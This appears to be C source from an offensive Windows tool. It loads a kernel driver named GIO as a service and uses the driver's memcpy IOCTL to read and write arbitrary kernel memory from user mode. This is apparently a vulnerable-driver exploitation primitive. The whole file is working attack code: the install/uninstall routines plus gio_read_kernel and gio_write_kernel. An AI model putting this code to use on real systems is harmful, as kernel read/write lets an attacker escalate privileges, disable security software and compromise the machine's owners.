#include <stdio.h>
#include "gio.h"

// ── Driver install / uninstall via SCM ──────────────────────────

BOOL gio_install(LPCWSTR driver_path) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        printf("[-] OpenSCManager failed: %lu\n", GetLastError());
        return FALSE;
    }

    SC_HANDLE svc = CreateServiceW(
        scm,
        GIO_SERVICE_NAME,
        GIO_SERVICE_NAME,
        SERVICE_START | SERVICE_STOP | DELETE,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        driver_path,
        NULL, NULL, NULL, NULL, NULL
    );

    if (!svc) {
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            svc = OpenServiceW(scm, GIO_SERVICE_NAME,
                SERVICE_START | SERVICE_STOP | DELETE);
            if (!svc) {
                printf("[-] OpenService failed: %lu\n", GetLastError());
                CloseServiceHandle(scm);
                return FALSE;
            }
        }
        else {
            printf("[-] CreateService failed: %lu\n", GetLastError());
            CloseServiceHandle(scm);
            return FALSE;
        }
    }

    if (!StartServiceW(svc, 0, NULL)) {
        if (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
            printf("[-] StartService failed: %lu\n", GetLastError());
            DeleteService(svc);
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return FALSE;
        }
    }

    printf("[+] Driver loaded successfully\n");
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return TRUE;
}

BOOL gio_uninstall(void) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return FALSE;

    SC_HANDLE svc = OpenServiceW(scm, GIO_SERVICE_NAME,
        SERVICE_STOP | DELETE);
    if (!svc) {
        CloseServiceHandle(scm);
        return FALSE;
    }

    SERVICE_STATUS status;
    ControlService(svc, SERVICE_CONTROL_STOP, &status);
    BOOL result = DeleteService(svc);

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    if (result)
        printf("[+] Driver unloaded and service deleted\n");

    return result;
}

// ── Kernel R/W via GIO IOCTL ────────────────────────────────────

HANDLE gio_open(void) {
    HANDLE h = CreateFileW(
        GIO_DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (h == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile on GIO device failed: %lu\n", GetLastError());
        return NULL;
    }

    printf("[+] Opened GIO device handle\n");
    return h;
}

void gio_close(HANDLE h) {
    if (h && h != INVALID_HANDLE_VALUE)
        CloseHandle(h);
}

BOOL gio_read_kernel(HANDLE h, ULONG_PTR kaddr, PVOID buf, DWORD size) {
    // memcpy(user_buf, kernel_addr, size)
    GIO_MEMCPY_INPUT input;
    input.Dest = (ULONG_PTR)buf;
    input.Src = kaddr;
    input.Size = size;

    DWORD bytes_returned = 0;
    return DeviceIoControl(
        h,
        IOCTL_GIO_MEMCPY,
        &input, sizeof(input),
        NULL, 0,
        &bytes_returned,
        NULL
    );
}

BOOL gio_write_kernel(HANDLE h, ULONG_PTR kaddr, PVOID buf, DWORD size) {
    // memcpy(kernel_addr, user_buf, size)
    GIO_MEMCPY_INPUT input;
    input.Dest = kaddr;
    input.Src = (ULONG_PTR)buf;
    input.Size = size;

    DWORD bytes_returned = 0;
    return DeviceIoControl(
        h,
        IOCTL_GIO_MEMCPY,
        &input, sizeof(input),
        NULL, 0,
        &bytes_returned,
        NULL
    );
}